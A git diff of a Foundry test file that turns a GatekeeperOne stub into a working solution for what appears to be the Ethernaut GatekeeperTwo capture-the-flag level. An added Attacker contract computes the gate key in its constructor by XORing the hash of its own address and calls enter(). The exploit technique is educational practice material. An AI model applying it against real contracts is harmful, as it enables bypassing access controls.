@@ -2,25 +2,25 @@
 pragma solidity ^0.8.13;
 
 import {Test, console} from "forge-std/Test.sol";
-import {GatekeeperOne} from "~/GatekeeperOne.sol";
+import {GatekeeperTwo} from "~/GatekeeperTwo.sol";
 
-contract GatekeeperOneTest is Test {
-    GatekeeperOne target;
+contract GatekeeperTwoTest is Test {
+    GatekeeperTwo target;
     address player;
 
     function setUp() public {
         player = makeAddr("player");
         vm.deal(player, 1 ether);
 
-        target = new GatekeeperOne();
+        target = new GatekeeperTwo();
     }
 
     function attack() private {
-        // TODO: attack
+        new Attacker(target);
     }
 
     function testAttack() public {
-        vm.startPrank(player);
+        vm.startPrank(player, player); // tx.origin is pranked as well
         attack();
         vm.stopPrank();
 
@@ -31,5 +31,9 @@ contract GatekeeperOneTest is Test {
 contract Attacker {
     address owner;
 
-    constructor() {}
+    constructor(GatekeeperTwo target) {
+        // gets past the third gate, the hash of address will be canceled due to XOR
+        bytes8 key = bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
+        target.enter(key);
+    }
 }
